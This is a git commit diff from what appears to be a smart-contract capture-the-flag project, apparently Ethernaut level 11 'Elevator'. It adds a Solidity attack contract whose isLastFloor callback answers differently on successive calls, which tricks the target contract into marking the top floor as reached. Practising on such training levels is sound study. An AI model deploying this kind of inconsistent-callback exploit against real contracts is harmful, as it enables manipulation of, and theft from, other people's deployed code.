636cac3f53cc4a98c5a419f3b508bdce8f550917
Kamil Chmielewski <chmielewski.kamil45@gmail.com>
2022-11-07 21:49:55 +0100

    feat(lvl11): add attack logic

--- src/levels/11-Elevator/ElevatorAttack.sol
+++ src/levels/11-Elevator/ElevatorAttack.sol
@@ -4,7 +4,21 @@ pragma solidity ^0.6.0;
 import "src/levels/11-Elevator/Elevator.sol";
 
 contract ElevatorAttack is Building {
+    Elevator elevator;
+
+    constructor(address _elevatorContractAddress) public {
+        elevator = Elevator(_elevatorContractAddress);
+    }
+
     function isLastFloor(uint256 _floor) external override returns (bool) {
-        return false;
+        if (elevator.floor() == 0) {
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+    function goToTopFloor() public {
+        elevator.goTo(100);
     }
 }
